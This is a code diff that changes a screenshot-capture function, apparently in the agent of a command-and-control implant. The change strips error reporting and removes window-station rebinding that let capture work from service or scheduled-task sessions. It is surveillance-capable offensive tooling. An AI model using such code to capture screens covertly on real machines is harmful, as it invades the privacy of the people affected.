@@ -1085,9 +1085,7 @@ VOID AnonPipesRead(
  */
 BOOL WinScreenshot(
     OUT PVOID*  ImagePointer,
-    OUT PSIZE_T ImageSize,
-    OUT PCHAR*  ErrorReason,
-    OUT PDWORD  ErrorCode
+    OUT PSIZE_T ImageSize
 ) {
     BITMAPFILEHEADER    BitFileHdr  = { 0 };
     BITMAPINFOHEADER    BitInfoHdr  = { 0 };
@@ -1103,15 +1101,6 @@ BOOL WinScreenshot(
     PVOID               BitMapImage = NULL;
     DWORD               BitMapSize  = 0;
 
-    HWINSTA             hOldWinSta  = NULL;
-    HWINSTA             hWinSta     = NULL;
-    HDESK               hOldDesk    = NULL;
-    HDESK               hDesk       = NULL;
-    DWORD               dwThreadId  = 0;
-
-    if ( ErrorReason ) *ErrorReason = NULL;
-    if ( ErrorCode   ) *ErrorCode   = 0;
-
     /* Use SM_CX/CYVIRTUALSCREEN for extent; avoid GetCurrentObject+DeleteObject on the display DC bitmap (invalid + wrong size on some sessions). */
     INT x      = Instance->Win32.GetSystemMetrics( SM_XVIRTUALSCREEN );
     INT y      = Instance->Win32.GetSystemMetrics( SM_YVIRTUALSCREEN );
@@ -1120,8 +1109,6 @@ BOOL WinScreenshot(
 
     if ( width <= 0 || height <= 0 ) {
         PUTS( "GetSystemMetrics virtual screen size invalid" )
-        if ( ErrorReason ) *ErrorReason = "GetSystemMetrics returned invalid virtual screen size";
-        if ( ErrorCode   ) *ErrorCode   = NtGetLastError();
         goto Cleanup;
     }
 
@@ -1129,62 +1116,9 @@ BOOL WinScreenshot(
     MemSet( &BitInfoHdr, 0, sizeof( BITMAPINFOHEADER ) );
     MemSet( &BitMapInfo, 0, sizeof( BITMAPINFO ) );
 
-    /*
-     * In non-interactive sessions (S4U schtask, service context) the process
-     * may be attached to a restricted or NULL window station, causing GetDC(NULL)
-     * to return NULL or to block waiting for the Win32k session lock.
-     * Explicitly open WinSta0\Default and re-bind the thread before any GDI call;
-     * this mirrors what interactive processes have implicitly.
-     *
-     * Guard every function pointer before calling — if user32 loaded without
-     * exporting one of these symbols the pointer is NULL and calling it crashes.
-     */
-    if ( Instance->Win32.OpenWindowStation      &&
-         Instance->Win32.GetProcessWindowStation &&
-         Instance->Win32.SetProcessWindowStation &&
-         Instance->Win32.CloseWindowStation      &&
-         Instance->Win32.GetThreadDesktop        &&
-         Instance->Win32.OpenDesktopA            &&
-         Instance->Win32.SetThreadDesktop        &&
-         Instance->Win32.CloseDesktop ) {
-
-    dwThreadId = (DWORD)(ULONG_PTR)Instance->Teb->ClientId.UniqueThread;
-    hOldWinSta = Instance->Win32.GetProcessWindowStation();
-    hWinSta    = Instance->Win32.OpenWindowStation( "WinSta0", FALSE,
-                     WINSTA_READATTRIBUTES | WINSTA_READSCREEN );
-    if ( hWinSta ) {
-        if ( Instance->Win32.SetProcessWindowStation( hWinSta ) ) {
-            hOldDesk = Instance->Win32.GetThreadDesktop( dwThreadId );
-            hDesk    = Instance->Win32.OpenDesktopA( "Default", 0, FALSE,
-                           DESKTOP_READOBJECTS | GENERIC_READ );
-            if ( hDesk ) {
-                if ( ! Instance->Win32.SetThreadDesktop( hDesk ) ) {
-                    /* Failed to bind — undo window station change */
-                    Instance->Win32.CloseDesktop( hDesk );
-                    hDesk = NULL;
-                    Instance->Win32.SetProcessWindowStation( hOldWinSta );
-                    Instance->Win32.CloseWindowStation( hWinSta );
-                    hWinSta = NULL;
-                }
-            } else {
-                /* Can't open Default desktop — undo window station change */
-                Instance->Win32.SetProcessWindowStation( hOldWinSta );
-                Instance->Win32.CloseWindowStation( hWinSta );
-                hWinSta = NULL;
-            }
-        } else {
-            Instance->Win32.CloseWindowStation( hWinSta );
-            hWinSta = NULL;
-        }
-    }
-
-    } /* end: WinSta0/desktop fn-ptr guard */
-
     hDC = Instance->Win32.GetDC( NULL );
     if ( ! hDC ) {
         PUTS( "GetDC failed" )
-        if ( ErrorReason ) *ErrorReason = "GetDC(NULL) failed — NULL display DC";
-        if ( ErrorCode   ) *ErrorCode   = NtGetLastError();
         goto Cleanup;
     }
 
@@ -1205,39 +1139,29 @@ BOOL WinScreenshot(
     BitMapImage = Instance->Win32.LocalAlloc( LPTR, BitMapSize );
     if ( ! BitMapImage ) {
         PUTS( "LocalAlloc failed" )
-        if ( ErrorReason ) *ErrorReason = "LocalAlloc failed — out of memory";
-        if ( ErrorCode   ) *ErrorCode   = NtGetLastError();
         goto Cleanup;
     }
 
     hMemDC  = Instance->Win32.CreateCompatibleDC( hDC );
     if ( ! hMemDC ) {
         PUTS( "CreateCompatibleDC failed" )
-        if ( ErrorReason ) *ErrorReason = "CreateCompatibleDC failed";
-        if ( ErrorCode   ) *ErrorCode   = NtGetLastError();
         goto Cleanup;
     }
 
     hBitmap = Instance->Win32.CreateDIBSection( hDC, &BitMapInfo, DIB_RGB_COLORS, ( VOID** ) &bBits, NULL, 0 );
     if ( ! hBitmap ) {
         PUTS( "CreateDIBSection failed" )
-        if ( ErrorReason ) *ErrorReason = "CreateDIBSection failed";
-        if ( ErrorCode   ) *ErrorCode   = NtGetLastError();
         goto Cleanup;
     }
 
     OldBmp = Instance->Win32.SelectObject( hMemDC, hBitmap );
     if ( ! OldBmp || OldBmp == HGDI_ERROR ) {
         PUTS( "SelectObject failed" )
-        if ( ErrorReason ) *ErrorReason = "SelectObject failed";
-        if ( ErrorCode   ) *ErrorCode   = NtGetLastError();
         goto Cleanup;
     }
 
     if ( ! Instance->Win32.BitBlt( hMemDC, 0, 0, width, height, hDC, x, y, SRCCOPY ) ) {
         PUTS( "BitBlt failed" )
-        if ( ErrorReason ) *ErrorReason = "BitBlt failed — screen capture blocked or GDI error";
-        if ( ErrorCode   ) *ErrorCode   = NtGetLastError();
         goto Cleanup;
     }
 
@@ -1274,21 +1198,6 @@ Cleanup:
 
     if ( hDC ) {
         Instance->Win32.ReleaseDC( NULL, hDC );
-    }
-
-    /* Restore original window station / desktop if we changed them */
-    if ( hDesk ) {
-        if ( hOldDesk ) {
-            Instance->Win32.SetThreadDesktop( hOldDesk );
-        }
-        Instance->Win32.CloseDesktop( hDesk );
-    }
-
-    if ( hWinSta ) {
-        if ( hOldWinSta ) {
-            Instance->Win32.SetProcessWindowStation( hOldWinSta );
-        }
-        Instance->Win32.CloseWindowStation( hWinSta );
     }
 
     return ReturnValue;
